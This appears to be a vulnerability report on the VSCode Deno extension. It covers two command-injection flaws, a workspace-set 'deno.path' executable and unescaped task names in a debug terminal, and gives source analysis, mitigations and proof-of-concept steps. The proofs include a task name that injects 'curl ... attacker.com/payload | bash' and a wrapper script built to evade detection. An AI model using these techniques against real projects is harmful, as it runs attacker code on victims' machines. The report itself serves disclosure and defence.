# Vulnerabilities

## 1. Command Injection via Deno CLI Path

### Description
When a user opens a repository with a malicious `deno.path` configuration, the VSCode Deno extension resolves the Deno CLI executable path from this configuration. A malicious actor can provide a repository with a custom settings.json file that points the `deno.path` to a malicious executable. When the extension executes Deno operations (like starting the language server or running tests), it will execute this malicious executable instead of the legitimate Deno CLI.

Step by step exploitation:
1. Attacker creates a malicious executable (e.g., a script that executes arbitrary commands)
2. Attacker creates a Deno project with a `.vscode/settings.json` file that sets the `deno.path` configuration to point to their malicious executable
3. When a victim opens this repository in VSCode, the extension will use the malicious executable for all Deno operations
4. The malicious code executes with the victim's privileges as soon as any Deno functionality is triggered

### Impact
This vulnerability allows an attacker to execute arbitrary code on the victim's system with the victim's privileges. The malicious executable could exfiltrate sensitive information, install malware, compromise the system, or perform any other actions available to the user.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
There are no mitigations in place. The `deno.path` configuration is used directly to resolve the Deno CLI executable path without any validation or sanitization.

### Missing Mitigations
- The extension should validate the `deno.path` configuration to ensure it points to a legitimate Deno CLI executable
- The extension should warn users with a security prompt when a custom `deno.path` is configured in a workspace
- The extension could implement a checksum verification of the Deno binary before execution

### Preconditions
- The victim must open a repository with a malicious `deno.path` configuration in their settings.json file
- The VSCode Deno extension must be installed

### Source Code Analysis
In `util.ts`, the `getDenoCommandPath` function retrieves the Deno CLI path from the VSCode configuration:

```typescript
export async function getDenoCommandPath() {
  const command = getWorkspaceConfigDenoExePath();
  const workspaceFolders = workspace.workspaceFolders;
  if (!command || !workspaceFolders) {
    return command ?? await getDefaultDenoCommand();
  } else if (!path.isAbsolute(command)) {
    // if sent a relative path, iterate over workspace folders to try and resolve.
    for (const workspace of workspaceFolders) {
      const commandPath = path.resolve(workspace.uri.fsPath, command);
      if (await fileExists(commandPath)) {
        return commandPath;
      }
    }
    return undefined;
  } else {
    return command;
  }
}
```

This function then returns the path to be used when spawning the Deno process. In `commands.ts`, the extension starts the language server using this path:

```typescript
const command = await getDenoCommandPath();
if (command == null) {
  const message = "Could not resolve Deno executable. Please ensure it is available " +
    `on the PATH used by VS Code or set an explicit "deno.path" setting.`;
  // ...
  return;
}

// ...

const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  debug: {
    command,
    args: ["lsp"],
    options: { env },
  },
};
```

When the extension executes any Deno CLI operation, it will use the executable at the configured path, which could be malicious.

### Security Test Case
1. Create a malicious executable called "fake-deno" with the following content:
   ```bash
   #!/bin/bash
   # This could be any malicious code
   # For testing, just create a file to prove execution
   touch /tmp/deno-rce-proof

   # Optionally, pass through to the real deno to avoid detection
   /usr/bin/deno "$@"
   ```

2. Make it executable:
   ```bash
   chmod +x fake-deno
   ```

3. Create a Deno project with a `.vscode/settings.json` file:
   ```json
   {
     "deno.enable": true,
     "deno.path": "/path/to/fake-deno"
   }
   ```

4. Open the project in VSCode with the Deno extension installed.

5. Verify that `/tmp/deno-rce-proof` file was created, confirming the malicious code execution.

## 2. Command Injection via Debug Terminal

### Description
The VSCode Deno extension's `#debugTask` function in `tasks_sidebar.ts` creates a debug terminal that executes a command string that includes the task name without proper escaping. A malicious repository can define a task with shell metacharacters in its name, which will be executed by the shell when the victim runs the task in the debug terminal.

Step by step exploitation:
1. Attacker creates a Deno project with a `deno.json` file containing a task with malicious shell commands in its name (e.g., `legitimate-task-name; curl -s http://attacker.com/payload | bash`)
2. Victim opens the project in VSCode with the Deno extension
3. When the victim runs the debug task through the extension interface, the shell metacharacters in the task name are interpreted by the shell
4. The injected commands execute with the victim's privileges

### Impact
This vulnerability allows an attacker to execute arbitrary commands on the victim's system with the victim's privileges. The injected commands could exfiltrate sensitive information, install malware, or perform other malicious actions.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
There are no mitigations in place. The task name is inserted directly into the command string without any escaping or validation.

### Missing Mitigations
- The extension should properly escape task names before inserting them into command strings
- The extension could use VSCode's API to execute tasks directly instead of constructing command strings

### Preconditions
- The victim must open a repository with a malicious task definition
- The victim must run the malicious task using the debug functionality

### Source Code Analysis
In `tasks_sidebar.ts`, the `#debugTask` function creates a debug terminal:

```typescript
async #debugTask(task: DenoTask) {
  const command = `${await getDenoCommandName()} task ${task.task.name}`;
  commands.executeCommand(
    "extension.js-debug.createDebuggerTerminal",
    command,
    task.getFolder(),
    {
      cwd: path.dirname(task.denoJson.resourceUri!.fsPath),
    },
  );
}
```

The `task.task.name` is inserted directly into the command string without any escaping or validation. When the user runs the task in the debug terminal, the resulting command string (e.g., `deno task malicious-name; evil-command`) is executed by the shell. The shell interprets any metacharacters in the task name, potentially executing injected commands.

### Security Test Case
1. Create a Deno project with a `deno.json` file containing a malicious task:
   ```json
   {
     "tasks": {
       "legitimate-name; touch /tmp/deno-debug-injection-proof": "echo 'This is a legitimate task'"
     }
   }
   ```

2. Open the project in VSCode with the Deno extension installed.

3. Run the task in debug mode by right-clicking on the task in the Deno Tasks panel and selecting "Debug Task".

4. Verify that `/tmp/deno-debug-injection-proof` file was created, confirming the command injection.
